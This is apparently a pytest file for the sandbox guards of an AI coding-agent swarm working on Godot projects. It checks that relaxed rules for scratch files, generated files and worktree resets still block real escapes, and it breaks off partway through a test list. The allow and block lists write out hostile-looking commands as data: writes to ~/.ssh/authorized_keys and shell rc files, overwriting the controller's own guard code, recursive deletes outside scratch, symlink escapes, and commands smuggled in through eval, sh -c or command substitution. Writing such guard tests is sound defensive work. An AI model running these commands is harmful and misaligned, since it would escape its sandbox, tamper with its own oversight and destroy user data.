"""Guard false positives (handoff 2026-09-29, work item 2).

Layer 1 used to be stricter than the sandbox about scratch files and blocked
agents from deleting orphaned generated files.  These tests pin the relaxed
behaviour and -- just as important -- that every real escape still blocks.

Denial tests must be load-bearing: ``tmp_path`` lives under the per-user temp
dir, which the real ``_temp_roots()`` trusts, so conftest pins the scratch
roots to one dir per test (``_pin_scratch_roots``).  Tests of the real roots
request ``real_temp_roots`` and only ever deny targets that are not temp paths
at all (the real swarm-controller checkout, the real home dir).
"""

import os
import tempfile
from pathlib import Path

import pytest

from swarm.tools import path_guard
from swarm.tools._shared import ToolContext, sync_tool_context
from swarm.tools.files import read_file, write_file
from swarm.tools.path_guard import _command_attempts_protected_write, _confine_project_path
from swarm.tools.shell_guard import check_command

_REAL_HOME = Path(os.path.realpath(os.path.expanduser("~")))
_ESCAPE_TARGET = path_guard._SWARM_CONTROLLER_ROOT / "validate_godot.py"


def _blocked(cmd: str):
    """What run_command would refuse, in the order it checks."""
    return check_command(cmd) or _command_attempts_protected_write(cmd)


@pytest.fixture
def pinned_scratch(tmp_path):
    """A project, the pinned scratch root, and an 'outside' dir that is not
    trusted as scratch."""
    workspace = tmp_path / "workspace"
    proj = workspace / "game"
    proj.mkdir(parents=True)
    (scratch,) = path_guard._temp_roots()
    scratch.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    sync_tool_context(ToolContext(
        workspace=workspace, project="game", project_path_override="",
        task_type="feature", readonly=False,
    ))
    return {"proj": proj, "scratch": scratch, "outside": outside}


# ---------------------------------------------------------------------------
# Canaries: the preconditions that keep the denial tests honest
# ---------------------------------------------------------------------------

def test_escape_targets_are_not_temp_paths(real_temp_roots):
    assert not path_guard._is_temp_path(_ESCAPE_TARGET)
    assert not path_guard._is_temp_path(_REAL_HOME / ".ssh" / "authorized_keys")


def test_pinned_outside_is_not_scratch(pinned_scratch):
    assert not path_guard._is_temp_path(Path(os.path.realpath(pinned_scratch["outside"])) / "x")
    assert path_guard._is_temp_path(Path(os.path.realpath(pinned_scratch["scratch"])) / "x")


# ---------------------------------------------------------------------------
# _temp_roots()
# ---------------------------------------------------------------------------

def test_temp_roots_include_tmp_and_var_tmp(real_temp_roots):
    roots = path_guard._temp_roots()
    assert Path(os.path.realpath("/tmp")) in roots
    assert Path(os.path.realpath("/var/tmp")) in roots
    assert path_guard._is_temp_path(Path(os.path.realpath("/tmp")) / "probe.gd")


def test_temp_root_itself_is_not_inside_itself(real_temp_roots):
    # strictly inside: the root dir itself is not a writable target
    assert not path_guard._is_temp_path(Path(os.path.realpath("/tmp")))


def test_tmpdir_pointed_at_home_does_not_widen_allowlist(real_temp_roots, monkeypatch):
    monkeypatch.setattr(tempfile, "tempdir", str(_REAL_HOME))
    assert _REAL_HOME not in path_guard._temp_roots()
    assert not path_guard._is_temp_path(_REAL_HOME / ".zshrc")


# ---------------------------------------------------------------------------
# File tools
# ---------------------------------------------------------------------------

class TestFileToolScratch:
    def test_read_write_scratch_file(self, pinned_scratch):
        probe = pinned_scratch["scratch"] / "probe.gd"
        assert write_file(str(probe), "extends Node\n")["ok"] is True
        assert probe.read_text() == "extends Node\n"
        assert read_file(str(probe))["ok"] is True

    def test_real_tmp_is_confined_ok(self, pinned_scratch, real_temp_roots):
        path, err = _confine_project_path("/tmp/probe_x.gd")
        assert err is None
        assert path == Path(os.path.realpath("/tmp")) / "probe_x.gd"

    def test_write_outside_still_refused(self, pinned_scratch):
        target = pinned_scratch["outside"] / "x.gd"
        result = write_file(str(target), "x")
        assert result["ok"] is False
        assert "outside the project root" in result["error"]
        assert not target.exists()

    def test_write_into_swarm_controller_refused(self, pinned_scratch):
        path, err = _confine_project_path(str(_ESCAPE_TARGET))
        assert path is None
        assert "outside the project root" in err["error"]

    def test_symlink_in_project_to_home_refused(self, pinned_scratch):
        home = pinned_scratch["outside"] / "home"
        home.mkdir()
        os.symlink(home, pinned_scratch["proj"] / "homelink")
        result = write_file("homelink/.zshrc", "pwned")
        assert result["ok"] is False
        assert not (home / ".zshrc").exists()

    def test_symlink_in_scratch_to_outside_refused(self, pinned_scratch):
        os.symlink(pinned_scratch["outside"], pinned_scratch["scratch"] / "link")
        result = write_file(str(pinned_scratch["scratch"] / "link" / "x.gd"), "x")
        assert result["ok"] is False
        assert not (pinned_scratch["outside"] / "x.gd").exists()


# ---------------------------------------------------------------------------
# Shell commands (check_command + _command_attempts_protected_write)
# ---------------------------------------------------------------------------

ALLOWED = [
    "git show abc:x.gd > /tmp/orig.gd",
    "godot --headless --quit 2>&1 > /tmp/log",
    "cat > /tmp/claim.txt <<EOF\nclaimed\nEOF",
    "cp -f scripts/a.gd /tmp/a.gd",
    "git rm a.gd.uid b.gd.uid",
    "git rm _gut_runner.gd.uid",
    "rm scripts/foo.gd.uid",
    "rm -f scripts/foo.gd.uid",
    "rm .godot/global_script_class_cache.cfg",
]


@pytest.mark.parametrize("cmd", ALLOWED)
def test_shell_allowed(cmd, real_temp_roots):
    assert _blocked(cmd) is None, f"{cmd!r} wrongly blocked: {_blocked(cmd)!r}"


BLOCKED = [
    f"echo x > {_ESCAPE_TARGET}",
    f"cp -f a.py {_ESCAPE_TARGET}",
    "cp a ~/.ssh/authorized_keys",
    "echo x > $HOME/x",
    f"echo x > {_REAL_HOME / 'x'}",
    "rm -rf .godot/",
    "rm addons/gut/x.gd",
    "rm x.uid addons/y",
    "rm x.uid && cp evil addons/gut/gut.gd",
    "rm x.uid; mv a.gd b.uid",
    "cp a x.uid",
    "echo uid://x > y.uid",
    "sed -i 's/a/b/' x.uid",
    "touch scripts/new.gd.uid",
]


@pytest.mark.parametrize("cmd", BLOCKED)
def test_shell_blocked(cmd, real_temp_roots):
    assert _blocked(cmd) is not None, f"{cmd!r} was not blocked"


def test_shell_write_outside_pinned_scratch_blocked(pinned_scratch):
    target = os.path.realpath(pinned_scratch["outside"] / "x")
    assert check_command(f"echo x > {target}") is not None
    ok = os.path.realpath(pinned_scratch["scratch"] / "x")
    assert check_command(f"echo x > {ok}") is None


def test_shell_symlink_in_scratch_to_outside_blocked(pinned_scratch):
    os.symlink(pinned_scratch["outside"], pinned_scratch["scratch"] / "link")
    link = os.path.realpath(pinned_scratch["scratch"]) + "/link/x"
    assert check_command(f"echo x > {link}") is not None


def test_generated_removal_still_blocks_guardrail_paths(tmp_path):
    workspace = tmp_path / "ws"
    (workspace / "swarm-controller").mkdir(parents=True)
    sync_tool_context(ToolContext(
        workspace=workspace, project="swarm-controller", project_path_override="",
        task_type="feature", readonly=False,
    ))
    assert _command_attempts_protected_write("rm x.uid config.json") is not None
    assert _command_attempts_protected_write("rm x.uid prompts/feature.yaml") is not None
    assert _command_attempts_protected_write("rm x.uid") is None


# ---------------------------------------------------------------------------
# The project's own Godot user:// dir (saves, game output)
# ---------------------------------------------------------------------------

@pytest.fixture
def godot_home(pinned_scratch, tmp_path, monkeypatch):
    """A Godot project with a fake $HOME holding user data for it, another
    game, and the shared Godot/remote dir."""
    monkeypatch.setattr(path_guard.sys, "platform", "darwin")
    home = tmp_path / "home"
    godot = home / "Library" / "Application Support" / "Godot"
    for d in ("app_userdata/game", "app_userdata/Game Name", "app_userdata/other-game", "remote"):
        (godot / d).mkdir(parents=True)
    (home / ".ssh").mkdir()
    monkeypatch.setenv("HOME", str(home))
    (pinned_scratch["proj"] / "project.godot").write_text(
        '[application]\nconfig/name="Game Name"\n')
    return {**pinned_scratch, "home": home, "userdata": godot / "app_userdata", "godot": godot}


class TestGodotUserData:
    @pytest.mark.parametrize("name", ["game", "Game Name"])
    def test_own_userdata_writable(self, godot_home, name):
        save = godot_home["userdata"] / name / "save.json"
        assert write_file(str(save), "{}")["ok"] is True
        assert check_command(f"rm '{save}'") is None

    @pytest.mark.parametrize("rel", [
        "app_userdata/other-game/save.json",
        "app_userdata/save.json",
        "remote/leaderboard.json",
    ])
    def test_other_godot_data_refused(self, godot_home, rel):
        target = godot_home["godot"] / rel
        assert write_file(str(target), "{}")["ok"] is False
        assert not target.exists()
        assert check_command(f"rm '{target}'") is not None

    def test_home_still_refused(self, godot_home):
        assert write_file(str(godot_home["home"] / ".zshrc"), "x")["ok"] is False
        assert check_command(f"echo x > {godot_home['home'] / '.zshrc'}") is not None

    def test_symlink_out_of_userdata_refused(self, godot_home):
        os.symlink(godot_home["home"] / ".ssh", godot_home["userdata"] / "game" / "link")
        result = write_file(str(godot_home["userdata"] / "game" / "link" / "authorized_keys"), "x")
        assert result["ok"] is False
        assert not (godot_home["home"] / ".ssh" / "authorized_keys").exists()

    def test_non_godot_project_gets_no_userdata(self, godot_home):
        (godot_home["proj"] / "project.godot").unlink()
        save = godot_home["userdata"] / "game" / "save.json"
        assert write_file(str(save), "{}")["ok"] is False


# ---------------------------------------------------------------------------
# rm -rf of single named generated files
# ---------------------------------------------------------------------------

@pytest.fixture
def godot_cache(pinned_scratch):
    proj = pinned_scratch["proj"]
    (proj / ".godot" / "editor").mkdir(parents=True)
    (proj / ".godot" / "uid_cache.bin").write_text("x")
    (proj / ".godot" / "global_script_class_cache.cfg").write_text("x")
    (proj / ".import").mkdir()
    (proj / "scripts").mkdir()
    return proj


def test_rm_rf_named_generated_files_allowed(godot_cache):
    cache = os.path.realpath(godot_cache / ".godot" / "uid_cache.bin")
    for cmd in [
        "rm -rf .godot/global_script_class_cache.cfg .godot/uid_cache.bin 2>&1; godot --headless --editor --quit",
        f"rm -rf {cache}",
        "rm -f -r .import/icon.png-abc.ctex",
        "rm -rf .godot/not_created_yet.cfg 2>/dev/null && echo done",
    ]:
        assert _blocked(cmd) is None, f"{cmd!r} wrongly blocked: {_blocked(cmd)!r}"


@pytest.mark.parametrize("cmd", [
    "rm -rf .godot/",
    "rm -rf .godot",
    "rm -rf .godot/editor",
    "rm -rf .godot/*",
    "rm -rf .godot/uid_cache.bin scripts",
    "rm -rf .godot/uid_cache.bin && rm -rf scripts",
    "rm -rf .godot/../scripts",
    "rm -rf scripts/.godot",
    "rm -rf ~/.godot/x",
    "rm -rf",
    "find .godot -name uid_cache.bin -delete",
])
def test_rm_rf_still_blocked(godot_cache, cmd):
    assert _blocked(cmd) is not None, f"{cmd!r} was not blocked"


def test_rm_rf_generated_file_outside_project_blocked(godot_cache, pinned_scratch):
    other = pinned_scratch["outside"] / ".godot"
    other.mkdir()
    (other / "uid_cache.bin").write_text("x")
    assert _blocked(f"rm -rf {os.path.realpath(other / 'uid_cache.bin')}") is not None


def test_protected_block_logs_the_command(capsys):
    from swarm.tools.shell import run_command
    result = run_command("cp a.gd scripts/x.gd.uid")
    assert result["ok"] is False
    out = capsys.readouterr().out
    assert "kind=protected" in out and "cp a.gd scripts/x.gd.uid" in out


# ---------------------------------------------------------------------------
# Recursive deletes strictly inside a temp root
# ---------------------------------------------------------------------------

@pytest.fixture
def scratch_tree(pinned_scratch):
    """A bot dir in the (pinned) scratch root and a symlink out of it."""
    scratch = Path(os.path.realpath(pinned_scratch["scratch"]))
    (scratch / "playthrough_bot" / "shots").mkdir(parents=True)
    os.symlink(pinned_scratch["outside"], scratch / "link")
    return {**pinned_scratch, "s": scratch}


def test_scratch_recursive_delete_allowed(scratch_tree):
    s = scratch_tree["s"]
    for cmd in [
        f"rm -rf {s}/playthrough_bot",
        f"rm -rf {s}/playthrough_bot/*",
        f"ls {s}/playthrough_bot; rm -rf {s}/playthrough_bot 2>/dev/null; echo done",
        f"find {s}/playthrough_bot -name '*.png' -delete",
        f"rm -rf {s}/playthrough_bot .godot/uid_cache.bin",
    ]:
        assert _check_catastrophic(cmd) is None, f"{cmd!r} wrongly blocked"


def test_scratch_recursive_delete_still_blocked(scratch_tree):
    s = scratch_tree["s"]
    out = os.path.realpath(scratch_tree["outside"])
    for cmd in [
        f"rm -rf {s}",               # the root itself
        f"rm -rf {s}/",
        f"rm -rf {s}/*",             # everything in the root
        f"rm -rf {s}/link",          # symlink resolves outside
        f"rm -rf {s}/link/",
        f"rm -rf {s}/../outside",
        f"rm -rf {s}/playthrough_bot {out}",
        f"rm -rf {s}/playthrough_bot && rm -rf {out}",
        f"rm -rf {s}/$X",
        f"rm -rf playthrough_bot",   # relative -> project dir
        f"find {s} -delete",
        f"find -L {s}/playthrough_bot -delete",
        f"find {s}/playthrough_bot -follow -delete",
        f"find {s}/playthrough_bot {out} -delete",
        f"find {s}/link -delete",
    ]:
        assert _check_catastrophic(cmd) is not None, f"{cmd!r} was not blocked"


def _check_catastrophic(cmd):
    return path_guard._check_catastrophic_command(cmd)


# ---------------------------------------------------------------------------
# git reset --hard inside the agent's own worktree
# ---------------------------------------------------------------------------

def _git(cwd, *args):
    import subprocess
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True,
                   env={**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
                        "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"})


@pytest.fixture
def worktree(tmp_path):
    main = tmp_path / "ws" / "game"
    main.mkdir(parents=True)
    _git(main, "init", "-q", "-b", "main")
    (main / "a.gd").write_text("a\n")
    _git(main, "add", ".")
    _git(main, "commit", "-qm", "init")
    wt = tmp_path / "ws" / ".wt-game-abcd1234"
    _git(main, "worktree", "add", "-q", str(wt), "-b", "agent/abcd1234")
    sync_tool_context(ToolContext(
        workspace=tmp_path / "ws", project="game", project_path_override=str(wt),
        worktree_branch="agent/abcd1234", task_type="bug", readonly=False,
    ))
    yield {"main": main, "wt": wt}
    sync_tool_context(ToolContext(
        workspace=tmp_path / "ws", project="game", project_path_override="",
        worktree_branch="", task_type="feature", readonly=False,
    ))


@pytest.mark.parametrize("cmd", [
    "git reset --hard HEAD~1",
    "git reset --hard HEAD~1 && git log --oneline -3",
    "git reset --hard origin/main",
    "git status; git reset --hard",
])
def test_worktree_reset_allowed(worktree, cmd):
    assert _check_catastrophic(cmd) is None, cmd


def test_worktree_reset_blocked_when_aimed_elsewhere(worktree):
    main = worktree["main"]
    for cmd in [
        f"git -C {main} reset --hard HEAD~1",
        f"cd {main} && git reset --hard HEAD~1",
        "cd .. && git reset --hard",
        "pushd ../game; git reset --hard",
        f"git --git-dir={main}/.git --work-tree={main} reset --hard",
        f"GIT_DIR={main}/.git git reset --hard",
        "git reset --hard $(cat ref)",
        "git reset --hard `cat ref`",
        f"git reset --hard HEAD -- {main}/a.gd",
        "git reset --hard HEAD -- ../game/a.gd",
    ]:
        assert _check_catastrophic(cmd) is not None, f"{cmd!r} was not blocked"


def test_reset_blocked_outside_a_worktree(worktree, tmp_path):
    # Same branch name, but the root is the main checkout (.git is a directory).
    sync_tool_context(ToolContext(
        workspace=tmp_path / "ws", project="game", project_path_override=str(worktree["main"]),
        worktree_branch="agent/abcd1234", task_type="bug", readonly=False,
    ))
    assert _check_catastrophic("git reset --hard HEAD~1") is not None


def test_reset_blocked_without_worktree_branch(worktree, tmp_path):
    sync_tool_context(ToolContext(
        workspace=tmp_path / "ws", project="game", project_path_override=str(worktree["wt"]),
        worktree_branch="", task_type="bug", readonly=False,
    ))
    assert _check_catastrophic("git reset --hard HEAD~1") is not None


def test_worktree_does_not_relax_other_git_ops(worktree):
    for cmd in ["git push --force", "git clean -fd", "git branch -D main"]:
        assert _check_catastrophic(cmd) is not None, cmd


def test_worktree_reset_leaves_main_untouched(worktree):
    """End to end: the allowed command really only moves the agent branch."""
    from swarm.tools.shell import run_command
    wt, main = worktree["wt"], worktree["main"]
    (wt / "a.gd").write_text("agent\n")
    _git(wt, "commit", "-qam", "agent work")
    (main / "a.gd").write_text("operator edit\n")  # uncommitted in main checkout
    result = run_command("git reset --hard HEAD~1")
    assert result["ok"] is True, result
    assert (wt / "a.gd").read_text() == "a\n"
    assert (main / "a.gd").read_text() == "operator edit\n"


# ---------------------------------------------------------------------------
# playthrough_bot may read playthrough_kit.py (only)
# ---------------------------------------------------------------------------

_KIT = path_guard._SWARM_CONTROLLER_ROOT / "swarm" / "tools" / "playthrough_kit.py"


@pytest.fixture
def fake_checkout(tmp_path, monkeypatch):
    """A stand-in swarm-controller checkout, so a regression that makes the
    kit writable can only ever damage a temp copy, never the real repo."""
    root = tmp_path / "fake-swarm-controller"
    (root / "swarm" / "tools").mkdir(parents=True)
    kit = root / "swarm" / "tools" / "playthrough_kit.py"
    kit.write_text("import os\n")
    (root / "swarm" / "tools" / "shell.py").write_text("x = 1\n")
    (root / "config.json").write_text("{}\n")
    monkeypatch.setattr(path_guard, "_SWARM_CONTROLLER_ROOT", Path(os.path.realpath(root)))
    return Path(os.path.realpath(kit))


def _as_task(pinned_scratch, task_type):
    sync_tool_context(ToolContext(
        workspace=pinned_scratch["proj"].parent, project="game", project_path_override="",
        task_type=task_type, readonly=False,
    ))


def test_playthrough_bot_reads_kit(pinned_scratch, fake_checkout):
    from swarm.tools.files import read_file_range
    _as_task(pinned_scratch, "playthrough_bot")
    assert read_file(str(fake_checkout))["ok"] is True
    assert read_file_range(str(fake_checkout), 1, 1)["ok"] is True


def test_kit_is_read_only_and_only_for_playthrough_bot(pinned_scratch, fake_checkout):
    from swarm.tools.files import patch_file
    _as_task(pinned_scratch, "playthrough_bot")
    assert write_file(str(fake_checkout), "x")["ok"] is False
    assert patch_file(str(fake_checkout), "import", "x")["ok"] is False
    assert fake_checkout.read_text() == "import os\n"
    assert read_file(str(fake_checkout.parent / "shell.py"))["ok"] is False
    assert read_file(str(path_guard._SWARM_CONTROLLER_ROOT / "config.json"))["ok"] is False
    _as_task(pinned_scratch, "feature")
    assert read_file(str(fake_checkout))["ok"] is False


def test_playthrough_prompt_points_at_kit():
    import swarm_runner
    s, u = swarm_runner._load_prompt(
        "playthrough_bot", project="x", project_path="/p", description="d",
        godot_status="", playthrough_kit_path=str(_KIT),
    )
    assert f'read_file("{_KIT}")' in s + u
    assert "kill_game()" in s + u


# ---------------------------------------------------------------------------
# game_input: StateServer input for non-QA Godot tasks
# ---------------------------------------------------------------------------

def test_game_input_sends_only_input_and_press_button(monkeypatch):
    from swarm import qa_tools
    sent = []
    monkeypatch.setattr(qa_tools, "_state_server_send", lambda cmd, port=None: sent.append(cmd) or {"ok": True})
    assert qa_tools.game_input({"type": "key", "key": "escape", "duration": 0.05})["ok"]
    assert qa_tools.game_input({"type": "click", "x": 3, "y": 4, "command": "screenshot_b64"})["ok"]
    assert qa_tools.game_input({"type": "press_button", "id": "play"})["ok"]
    assert sent == [
        {"command": "input", "type": "key", "key": "escape", "duration": 0.05},
        {"command": "input", "type": "click", "x": 3, "y": 4},
        {"command": "press_button", "id": "play", "text": "play"},
    ]
    for bad in ({"type": "quit"}, {"type": ""}, {"type": "press_button"}):
        assert qa_tools.game_input(bad)["ok"] is False
    assert len(sent) == 3


def test_game_input_registered_for_godot_and_advertised():
    from swarm.tool_dispatch import _TOOL_REGISTRY
    from swarm.phases.work import _WORK_SYSTEM
    spec = next(s for s in _TOOL_REGISTRY if s.name == "game_input")
    assert spec.godot_only and not spec.task_types
    assert "- game_input(" in _WORK_SYSTEM
    tools_md = (path_guard._SWARM_CONTROLLER_ROOT / "prompts" / "common" / "tools_godot.md").read_text()
    assert "- game_input(" in tools_md


@pytest.mark.parametrize("cmd", [
    "git -C /x/game reset --hard HEAD~1",
    "git -C /x/game push --force",
    "git -c core.x=1 push -f origin main",
    "git -C /x/game clean -fd",
    "git -C /x/game branch -D main",
])
def test_git_options_before_subcommand_still_blocked(cmd):
    # Regression: patterns used to require the subcommand right after `git`.
    assert _check_catastrophic(cmd) is not None, cmd


@pytest.mark.parametrize("cmd", [
    'git commit -m "revert: avoid reset --hard in bot"',
    'git commit -m "docs: never push --force"',
    "git log --grep 'branch -D'",
])
def test_git_messages_mentioning_destructive_ops_allowed(cmd):
    assert _check_catastrophic(cmd) is None, cmd


def test_playthrough_prompt_advertises_run_python():
    import swarm_runner
    s, u = swarm_runner._load_prompt(
        "playthrough_bot", project="x", project_path="/p", description="d",
        godot_status="", playthrough_kit_path=str(_KIT),
    )
    assert "- run_python(" in s + u


# ---------------------------------------------------------------------------
# Protected-write check is scoped to the simple command that writes
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    # the four blocked GUT runs from the 2026-09-30 18:58 trip
    "cp /tmp/test_minimal.gd tests/test_minimal_main_game.gd\ngodot --headless --path . -s addons/gut/gut_cmdln.gd -gtest=res://tests/test_minimal_main_game.gd -gexit 2>&1 | tail -15",
    "cp /tmp/test_minimal.gd tests/test_minimal_main_game.gd && godot --headless --path . -s addons/gut/gut_cmdln.gd -gtest=res://tests/test_minimal_main_game.gd -gexit 2>&1 | tail -15",
    "rm tests/test_minimal_main_game.gd; godot --headless --path . -s addons/gut/gut_cmdln.gd -gtest=res://tests/test_combo_label_wiring.gd -gexit 2>&1 | tail -20",
    "cd /Users/dev/workspace/goblinchemy\nrm -f /tmp/gut_out.log\ngodot --headless --path . -s addons/gut/cli/gut_cli.gd -gtest=res://tests/test_achievement_system.gd -gexit > /tmp/gut_out.log 2>&1",
    "mkdir -p tests/unit && ls addons/gut",
])
def test_reading_addons_beside_an_unrelated_write_allowed(cmd):
    assert _command_attempts_protected_write(cmd) is None, cmd


@pytest.mark.parametrize("cmd", [
    "cp evil.gd addons/gut/gut.gd",
    "cp evil.gd addons/gut/gut.gd && godot -s addons/gut/gut_cmdln.gd",
    "ls; rm addons/gut/x.gd",
    "echo x > addons/gut/x.gd",
    "cd addons/gut && rm gut.gd",
    "cd addons && cp /tmp/x gut/gut.gd",
    "cd ./addons/gut; rm gut.gd",
    "find addons -name '*.gd' | xargs rm",
    "find addons -name '*.gd' -exec rm {} +",
    "rm $(ls addons/gut/*.gd)",
    "rm `ls addons/gut/*.gd`",
    "d=addons/gut; rm $d/gut.gd",
    "D=addons/gut rm ${D}/gut.gd",
    "eval 'rm addons/gut/gut.gd'",
    "sh -c 'rm addons/gut/gut.gd'",
    "bash -c 'cp x addons/gut/gut.gd'",
    "while read f; do rm \"$f\"; done < <(ls addons/gut)",
    "for f in addons/gut/*.gd; do rm $f; done",
    "env X=1 cp /tmp/x addons/gut/gut.gd",
    "ls addons/gut | tee addons/gut/list.txt",
    "sed -i 's/a/b/' addons/gut/gut.gd",
    "rm x.gd.uid; touch addons/gut/x.gd",
])
def test_writes_into_addons_still_blocked(cmd):
    assert _command_attempts_protected_write(cmd) is not None, f"{cmd!r} was not blocked"


def test_cd_in_swarm_controller_falls_back_to_strict(tmp_path):
    workspace = tmp_path / "ws"
    (workspace / "swarm-controller").mkdir(parents=True)
    sync_tool_context(ToolContext(
        workspace=workspace, project="swarm-controller", project_path_override="",
        task_type="feature", readonly=False,
    ))
    assert _command_attempts_protected_write("cd swarm/tools && cp /tmp/x path_guard.py; cat prompts/feature.yaml") is not None
    assert _command_attempts_protected_write("cp /tmp/x notes.md && cat prompts/feature.yaml") is None


@pytest.mark.parametrize("cmd", [
    "rm ./addons/gut/gut.gd",
    "cp /tmp/x ./addons/gut/gut.gd",
    "cp /tmp/x addons",
    "rm -f ./.godot/uid_cache.bin addons/gut/x.gd",
])
def test_dot_slash_and_bare_addons_blocked(cmd):
    # Regression: the patterns required a literal `addons/` with no ./ prefix.
    assert _command_attempts_protected_write(cmd) is not None, cmd


@pytest.mark.parametrize("cmd", [
    "git commit -m 'docs: mention addons folder'",
    "cp a.gd b.gd && grep -rn addons README.md",
    "rm -f ./.godot/uid_cache.bin",
    "ls my_addons/ && cp a b",
])
def test_addons_mentions_without_a_write_allowed(cmd):
    assert _command_attempts_protected_write(cmd) is None, cmd


@pytest.mark.parametrize("cmd", [
    "cd .godot && cp /tmp/evil editor/editor_layout.cfg",
    "cd ./.import; touch x.ctex",
])
def test_cd_into_generated_tree_then_write_blocked(cmd):
    assert _command_attempts_protected_write(cmd) is not None, cmd


def test_godot_prompts_point_away_from_pkill_and_sockets():
    from swarm.phases.work import _WORK_SYSTEM
    tools_md = (path_guard._SWARM_CONTROLLER_ROOT / "prompts" / "common" / "tools_godot.md").read_text()
    assert "- kill_game():" in tools_md and 'screenshot_b64' in tools_md
    assert "pkill" in _WORK_SYSTEM


# ---------------------------------------------------------------------------
# Plain `python -c` in run_command is rerouted to run_python
# ---------------------------------------------------------------------------

def test_inline_python_runs_via_run_python(pinned_scratch):
    from swarm.tools.shell import run_command
    (pinned_scratch["proj"] / "data.json").write_text('{"a": [1, 2, 3]}')
    r = run_command("python3 -c \"import json; print(sum(json.load(open('data.json'))['a']))\" 2>&1")
    assert r["ok"] is True, r
    assert r["output"] == "6" and "run_python" in r["note"]


def test_inline_python_cd_into_project_subdir(pinned_scratch):
    from swarm.tools.shell import run_command
    (pinned_scratch["proj"] / "scripts").mkdir()
    (pinned_scratch["proj"] / "scripts" / "x.gd").write_text("extends Node\n")
    r = run_command(f"cd {pinned_scratch['proj']}/scripts && python3 -c \"print(open('x.gd').read().strip())\"")
    assert r["ok"] is True and r["output"] == "extends Node", r


def test_inline_python_still_gets_python_source_checks(pinned_scratch):
    from swarm.tools.shell import run_command
    target = pinned_scratch["outside"] / "evil.txt"
    r = run_command(f"python3 -c \"open('{target}', 'w').write('x')\"")
    assert r["ok"] is False and "blocked" in r["error"].lower()
    assert not target.exists()


@pytest.mark.parametrize("cmd", [
    "cat data.json | python3 -c 'import sys' | sh",
    "cat data.json other.json | python3 -c 'import sys'",
    "grep x data.json | python3 -c 'import sys'",
    "cat $(echo data.json) | python3 -c 'import sys'",
    "cat data.json | python3 -c 'print(1)' | grep x",
    "cp a.png b.png && python3 -c 'print(1)'",
    "python3 -c 'print(1)' & rm -rf scripts",
    "python3 -c 'print(1)' || rm -rf scripts",
    "python3 -c 'print(1)'\nrm -rf scripts",
    "cat data.json | python3 -c 'print(1)' | head -n 5 extra",
    "python3 -c 'print(1)' > out.txt",
    "python3 -c 'print(1)' extra-arg",
    "python3 -c 'print(1)'; rm -rf scripts",
    "python3 -c \"print(1)\" && echo done",
    "python3 -c `cat payload`",
])
def test_other_python_c_forms_still_blocked(pinned_scratch, cmd):
    from swarm.tools.shell import _inline_python_snippet, run_command
    assert _inline_python_snippet(cmd) is None, cmd
    assert run_command(cmd)["ok"] is False


def test_inline_python_cd_outside_project_still_blocked(pinned_scratch):
    from swarm.tools.shell import run_command
    r = run_command(f"cd {pinned_scratch['outside']} && python3 -c 'print(1)'")
    assert r["ok"] is False and "note" not in r


def test_inline_python_is_never_shell_expanded(pinned_scratch):
    from swarm.tools.shell import run_command
    marker = pinned_scratch["proj"] / "expanded"
    r = run_command(f"python3 -c \"$(touch {marker})\"")
    assert r["ok"] is False          # invalid Python, run without a shell
    assert not marker.exists()



# ---- wider reroute: file piped in, head/tail after ---------------------------

def _rc(cmd):
    from swarm.tools.shell import run_command
    return run_command(cmd)


@pytest.fixture
def trace(pinned_scratch):
    scratch = Path(os.path.realpath(pinned_scratch["scratch"]))
    (scratch / "bot").mkdir()
    (scratch / "bot" / "failure_context.json").write_text('{"last_ticks": [1, 2, 3]}')
    (scratch / "bot" / "trace.jsonl").write_text("".join(f'{{"t": {i}}}\n' for i in range(20)))
    return {**pinned_scratch, "bot": scratch / "bot"}


def test_cat_pipe_into_python(trace):
    r = _rc(f"cat {trace['bot']}/failure_context.json | python3 -c \"import json,sys; print(json.load(sys.stdin)['last_ticks'][-1])\"")
    assert r["ok"] is True and r["output"] == "3" and "run_python" in r["note"], r


@pytest.mark.parametrize("producer,expected", [
    ("head -3", "0,1,2"), ("head -n 2", "0,1"), ("tail -2", "18,19"), ("tail -n 1", "19"),
    ("sed -n '1,6p'", "0,1,2,3,4,5"), ("sed -n '4p'", "3"),
])
def test_line_producers(trace, producer, expected):
    r = _rc(f"{producer} {trace['bot']}/trace.jsonl 2>/dev/null | python3 -c "
            "\"import sys,json; print(','.join(str(json.loads(l)['t']) for l in sys.stdin))\"")
    assert r["ok"] is True and r["output"] == expected, r


def test_output_filters_and_cd(trace):
    proj = trace["proj"]
    (proj / "scripts").mkdir()
    r = _rc(f"cd {proj}/scripts && python3 -c \"[print(i) for i in range(100)]\" 2>&1 | head -50 | tail -2")
    assert r["ok"] is True and r["output"] == "48\n49", r


def test_relative_producer_resolves_against_cd(trace):
    proj = trace["proj"]
    (proj / "data.json").write_text('{"a": 5}')
    r = _rc(f"cd {proj} && cat data.json | python3 -c \"import json,sys; print(json.load(sys.stdin)['a'])\"")
    assert r["ok"] is True and r["output"] == "5", r


def test_producer_outside_allowed_roots_is_blocked(trace):
    secret = trace["outside"] / "secret.txt"
    secret.write_text("SECRET")
    r = _rc(f"cat {secret} | python3 -c 'import sys; print(sys.stdin.read())'")
    assert r["ok"] is False and "SECRET" not in str(r) and "note" not in r


def test_producer_symlink_out_of_scratch_is_blocked(trace):
    (trace["outside"] / "secret.txt").write_text("SECRET")
    os.symlink(trace["outside"] / "secret.txt", trace["bot"] / "link.json")
    r = _rc(f"cat {trace['bot']}/link.json | python3 -c 'import sys; print(sys.stdin.read())'")
    assert r["ok"] is False and "SECRET" not in str(r)


def test_piped_snippet_still_gets_python_checks(trace):
    target = trace["outside"] / "evil.txt"
    r = _rc(f"cat {trace['bot']}/trace.jsonl | python3 -c \"open('{target}', 'w').write('x')\"")
    assert r["ok"] is False and not target.exists()


@pytest.mark.parametrize("cmd", [
    "cat a.json | cat b.json | python3 -c 'print(1)'",
    "cat a.json | head -3 | python3 -c 'print(1)'",
])
def test_only_one_producer_stage(cmd):
    from swarm.tools.shell import _inline_python_snippet
    assert _inline_python_snippet(cmd) is None, cmd


# ---------------------------------------------------------------------------
# pkill/killall godot -> this agent's Godot only (2026-10-05 trip: 5 of 10)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    'pkill -f "/opt/homebrew/bin/godot" 2>/dev/null; sleep 1; echo "killed"',
